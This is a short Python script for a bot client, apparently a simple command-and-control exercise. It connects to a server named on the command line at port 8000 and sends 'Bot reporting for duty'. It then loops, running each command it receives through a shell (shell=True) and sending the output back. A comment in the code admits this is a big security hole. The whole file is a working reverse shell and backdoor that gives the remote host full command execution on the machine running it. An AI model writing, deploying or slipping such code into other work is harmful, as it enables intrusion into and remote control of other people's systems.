import sys
from subprocess import Popen, PIPE
from socket import *

serverName = sys.argv[1]
serverPort = 8000

#Create IPv4(AF_INET), TCPSocket(Sock_Stream)
clientSocket = socket(AF_INET, SOCK_STREAM)
clientSocket.connect((serverName, serverPort))
clientSocket.send('Bot reporting for duty'.encode())
command = clientSocket.recv(4064).decode()

while command != "exit":
	#We need to add shell=True here in order for the command to be executed through the root shell.
	# It's a big security hole, but...
	proc = Popen(command.split(" "), stdout=PIPE, stderr=PIPE, shell=True)
	result, err = proc.communicate()
	clientSocket.send(result)
	command = (clientSocket.recv(4064)).decode()
	
clientSocket.close()
